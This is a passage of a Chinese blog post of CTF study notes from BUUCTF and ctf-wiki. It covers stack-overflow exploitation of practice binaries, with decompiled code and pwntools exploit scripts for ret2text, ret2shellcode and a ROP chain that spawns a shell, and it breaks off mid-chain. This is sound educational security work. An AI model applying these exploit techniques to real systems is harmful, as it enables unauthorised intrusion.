<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="ctf-wiki一点东西system一般有三个可以开shell的参数，‘&#x2F;bin&#x2F;sh’，‘sh’，‘$0’\x24\x30， &#x2F;bin&#x2F;&#x2F;sh的值是2F 62 69 6E 2F 2F 73 68 栈溢出基本ropret2text(32位)checksec: 12345Arch:     i386-32-littleRELRO:    Partia">
<meta property="og:type" content="article">
<meta property="og:title" content="buuctf学习实录">
<meta property="og:url" content="https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="ctf-wiki一点东西system一般有三个可以开shell的参数，‘&#x2F;bin&#x2F;sh’，‘sh’，‘$0’\x24\x30， &#x2F;bin&#x2F;&#x2F;sh的值是2F 62 69 6E 2F 2F 73 68 栈溢出基本ropret2text(32位)checksec: 12345Arch:     i386-32-littleRELRO:    Partia">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-11-18T11:20:10.000Z">
<meta property="article:modified_time" content="2024-01-17T01:09:38.869Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>buuctf学习实录</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/01/29/ctfer/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/11/14/csapp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/&text=buuctf学习实录"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/&title=buuctf学习实录"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/&is_video=false&description=buuctf学习实录"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=buuctf学习实录&body=Check out this article: https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/&title=buuctf学习实录"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/&title=buuctf学习实录"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/&title=buuctf学习实录"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/&title=buuctf学习实录"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/&name=buuctf学习实录&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://gl-zhou.github.io/2023/11/18/buuctf%E5%AD%A6%E4%B9%A0%E5%AE%9E%E5%BD%95/&t=buuctf学习实录"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctf-wiki"><span class="toc-number">1.</span> <span class="toc-text">ctf-wiki</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E7%82%B9%E4%B8%9C%E8%A5%BF"><span class="toc-number">1.1.</span> <span class="toc-text">一点东西</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">1.2.</span> <span class="toc-text">栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%ACrop"><span class="toc-number">1.2.1.</span> <span class="toc-text">基本rop</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2text-32%E4%BD%8D"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">ret2text(32位)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2shellcode-32"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">ret2shellcode(32)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2syscall"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">ret2syscall</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%88ropchain%EF%BC%89%EF%BC%9A"><span class="toc-number">1.2.1.3.1.</span> <span class="toc-text">解法一（ropchain）：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8-%EF%BC%9A"><span class="toc-number">1.2.1.3.2.</span> <span class="toc-text">解法二(系统调用)：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%99%84-linux-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7%E8%A1%A8"><span class="toc-number">1.2.1.3.2.1.</span> <span class="toc-text">附 linux 系统调用号表</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.1.3.2.2.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%BB%86%E8%8A%82"><span class="toc-number">1.2.1.3.2.3.</span> <span class="toc-text">细节</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2libc"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ret2libc1"><span class="toc-number">1.2.1.4.1.</span> <span class="toc-text">ret2libc1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ret2libc2"><span class="toc-number">1.2.1.4.2.</span> <span class="toc-text">ret2libc2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ret2libc3"><span class="toc-number">1.2.1.4.3.</span> <span class="toc-text">ret2libc3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E7%BA%A7rop"><span class="toc-number">1.2.2.</span> <span class="toc-text">中级rop</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2csu"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">ret2csu</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">1.2.2.1.1.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%86%E8%8A%82-1"><span class="toc-number">1.2.2.1.2.</span> <span class="toc-text">细节</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E7%94%A8payload"><span class="toc-number">1.2.2.1.3.</span> <span class="toc-text">通用payload</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#easy-csu"><span class="toc-number">1.2.2.1.4.</span> <span class="toc-text">easy_csu</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ret2csu-1"><span class="toc-number">1.2.2.1.5.</span> <span class="toc-text">ret2csu</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ret2reg"><span class="toc-number">1.2.2.1.6.</span> <span class="toc-text">ret2reg</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#brop"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">brop</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%BA%A7rop"><span class="toc-number">1.2.3.</span> <span class="toc-text">高级rop</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2dlresolve"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">ret2dlresolve</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.3.1.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#32%E4%BD%8Dno-relro"><span class="toc-number">1.2.3.1.2.</span> <span class="toc-text">32位no relro</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#32%E4%BD%8DPartial-RELRO"><span class="toc-number">1.2.3.1.3.</span> <span class="toc-text">32位Partial RELRO</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E4%BC%AA%E9%80%A0"><span class="toc-number">1.2.3.1.3.1.</span> <span class="toc-text">手工伪造</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">1.2.3.1.3.2.</span> <span class="toc-text">工具</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#64-no-relro"><span class="toc-number">1.2.3.1.4.</span> <span class="toc-text">64_no_relro</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#srop"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">srop</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86"><span class="toc-number">1.3.</span> <span class="toc-text">堆</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#off-by-one-off-by-null"><span class="toc-number">1.3.1.</span> <span class="toc-text">off-by-one (off-by-null)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#House-Of-Force"><span class="toc-number">1.3.2.</span> <span class="toc-text">House Of Force</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bcloud-bctf-2016"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">bcloud_bctf_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">1.3.2.1.1.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.3.2.1.2.</span> <span class="toc-text">知识点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-number">1.3.2.1.3.</span> <span class="toc-text">利用步骤：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#newstar"><span class="toc-number">2.</span> <span class="toc-text">newstar</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-number">3.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#test-your-nc"><span class="toc-number">3.1.</span> <span class="toc-text">test_your_nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rip"><span class="toc-number">3.2.</span> <span class="toc-text">rip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup-csaw-2016"><span class="toc-number">3.3.</span> <span class="toc-text">warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-1"><span class="toc-number">3.4.</span> <span class="toc-text">ciscn_2019_n_1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-number">3.4.1.</span> <span class="toc-text">解法一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-number">3.4.2.</span> <span class="toc-text">解法二：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn1-sctf-2016"><span class="toc-number">3.5.</span> <span class="toc-text">pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level0"><span class="toc-number">3.6.</span> <span class="toc-text">jarvisoj_level0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="toc-number">3.7.</span> <span class="toc-text">[第五空间2019 决赛]PWN5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level2"><span class="toc-number">3.8.</span> <span class="toc-text">jarvisoj_level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.9.</span> <span class="toc-text"></span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        buuctf学习实录
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">John Doe</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-11-18T11:20:10.000Z" class="dt-published" itemprop="datePublished">2023-11-18</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="ctf-wiki"><a href="#ctf-wiki" class="headerlink" title="ctf-wiki"></a>ctf-wiki</h1><h2 id="一点东西"><a href="#一点东西" class="headerlink" title="一点东西"></a>一点东西</h2><p>system一般有三个可以开shell的参数，‘&#x2F;bin&#x2F;sh’，‘sh’，‘$0’\x24\x30，</p>
<p>&#x2F;bin&#x2F;&#x2F;sh的值是2F 62 69 6E 2F 2F 73 68</p>
<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="基本rop"><a href="#基本rop" class="headerlink" title="基本rop"></a>基本rop</h3><h4 id="ret2text-32位"><a href="#ret2text-32位" class="headerlink" title="ret2text(32位)"></a>ret2text(32位)</h4><p>checksec:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>ida发现了system（“&#x2F;bin&#x2F;sh”）和危险的gets()函数:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s[100]; // [esp+1Ch] [ebp-64h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(_bss_start, 0, 1, 0);</span><br><span class="line">  puts(&quot;There is something amazing here, do you know anything?&quot;);</span><br><span class="line">  gets(s);</span><br><span class="line">  printf(&quot;Maybe I will tell you next time !&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">void secure()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // eax</span><br><span class="line">  int input; // [esp+18h] [ebp-10h] BYREF</span><br><span class="line">  int secretcode; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v0 = time(0);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf(&amp;unk_8048760, &amp;input);</span><br><span class="line">  if ( input == secretcode )</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里写exp有个问题，就是直接写&#x2F;bin&#x2F;sh调用的地址而不是scure()函数的开始地址，直接绕过，以及gdb调试出来，偏移值为0x70。<br>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">#ip=</span><br><span class="line">#port=</span><br><span class="line"></span><br><span class="line">io=process(&#x27;./ret2text&#x27;)</span><br><span class="line">#io=remote(ip,port)</span><br><span class="line">backdoor=0x804863A</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*(0x70)+p32(backdoor)</span><br><span class="line">io.sendlineafter(&quot;There is something amazing here, do you know anything?&quot;,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="ret2shellcode-32"><a href="#ret2shellcode-32" class="headerlink" title="ret2shellcode(32)"></a>ret2shellcode(32)</h4><p>这类题是没有nx保护的<br>checksec:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX unknown - GNU_STACK missing</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">Stack:    Executable</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<p>ida发现buf2在bss段:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s[100]; // [esp+1Ch] [ebp-64h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;No system for you this time !!!&quot;);</span><br><span class="line">  gets(s);</span><br><span class="line">  strncpy(buf2, s, 0x64u);</span><br><span class="line">  printf(&quot;bye bye ~&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br><span class="line">.bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o</span><br><span class="line">.bss:0804A080 _bss            ends</span><br><span class="line">.bss:0804A080</span><br></pre></td></tr></table></figure>
<p>gdb查看得到bss段可写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">     Start        End Perm     Size Offset File</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000      0 /home/clayee/ctf-wiki/ret2shellcode</span><br><span class="line"> 0x8049000  0x804a000 r--p     1000      0 /home/clayee/ctf-wiki/ret2shellcode</span><br><span class="line"> 0x804a000  0x804b000 rw-p     1000   1000 /home/clayee/ctf-wiki/ret2shellcode</span><br></pre></td></tr></table></figure>
<p>向bss段写入shellcode<br>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">#ip=</span><br><span class="line">#port=</span><br><span class="line"></span><br><span class="line">io=process(&#x27;./ret2shellcode&#x27;)</span><br><span class="line">#io=remote(ip,port)</span><br><span class="line">buf2=0x0804A080</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload=shellcode.ljust(112,b&#x27;A&#x27;)+p32(buf2)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&quot;No system for you this time !!!&quot;,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h4><p>checksec：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>ida:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [esp+1Ch] [ebp-64h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;This time, no system() and NO SHELLCODE!!!&quot;);</span><br><span class="line">  puts(&quot;What do you plan to do?&quot;);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="解法一（ropchain）："><a href="#解法一（ropchain）：" class="headerlink" title="解法一（ropchain）："></a>解法一（ropchain）：</h5><p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># execve generated by ROPgadget</span><br><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line"></span><br><span class="line">context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">io=process(&#x27;./ret2syscall&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Padding goes here</span><br><span class="line">p = b&#x27;a&#x27;*112</span><br><span class="line"></span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806eb6a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080bb196) # pop eax ; ret</span><br><span class="line">p += b&#x27;/bin&#x27;</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0809a4ad) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806eb6a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080bb196) # pop eax ; ret</span><br><span class="line">p += b&#x27;//sh&#x27;</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0809a4ad) # 